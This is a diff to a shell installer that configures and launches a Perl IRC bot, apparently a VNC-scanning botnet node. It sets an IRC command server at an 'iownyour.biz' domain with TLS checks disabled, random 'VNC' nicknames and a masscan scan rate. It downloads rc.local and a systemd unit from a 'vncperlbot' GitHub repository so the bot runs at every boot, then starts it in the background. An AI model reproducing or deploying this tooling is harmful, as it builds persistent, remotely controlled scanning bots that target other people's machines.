@@ -33,7 +33,7 @@ read -p "Proceed to bot configurations? [Y/A] or LEAVE BLANK + ENTER" choice
 case $choice in
  A) 
  sed -i "perlircssl.pl" -e "s/#defineserverhere/server => \'irc-3.iownyour.biz:6697\',/g" "perlircssl.pl"
- sed -i "perlircssl.pl" -e "s/#definesslhere/\$irc->tls({insecure => 1});/g" "perlircssl.pl";
+ sed -i "perlircssl.pl" -e "s/#definesslhere/\$irc->tls({insecure => 1});/g" "perlircssl.pl"
  sed -i "perlircssl.pl" -e "s/#definenickhere/nick => \'VNC\'.int(rand(99999)),/g" "perlircssl.pl"
  sed -i "perlircssl.pl" -e "s/#definechanhere/my \$channel = \'#VNC\';/g" "perlircssl.pl"
  sed -i "perlircssl.pl" -e "s/#definenoticechanhere/my \$noticechan = \'@#VNC\';/g" "perlircssl.pl"
@@ -72,6 +72,8 @@ if read -p "Masscan RATE-LIMIT/Recommended: 25000" mrate; then
  sed -i "perlircssl.pl" -e "s|--rate 25000|--rate "$mrate"|g" "perlircssl.pl"
 fi
 ;;
+*)
+;;
 esac
 cp -r ./perlircssl.pl ~/perlircssl.pl;
 if [ ! -f "./rc.local" ]; then curl -Lv -o /etc/rc.local https://raw.githubusercontent.com/ind3p3nd3nt/vncperlbot/master/rc.local; else cp -r ./rc.local /etc/rc.local; fi;
@@ -80,4 +82,4 @@ chmod 755 /etc/rc.local;
 touch /etc/systemd/system/rc-local.service;
 if [ ! -f "./rc-local.service" ]; then curl -Lv -o /etc/systemd/system/rc-local.service https://raw.githubusercontent.com/ind3p3nd3nt/vncperlbot/master/rc-local.service; else cp -r ./rc-local.service /etc/systemd/system/rc-local.service; fi;
 systemctl enable rc-local;  
-perl perlircssl.pl &;
+perl perlircssl.pl &
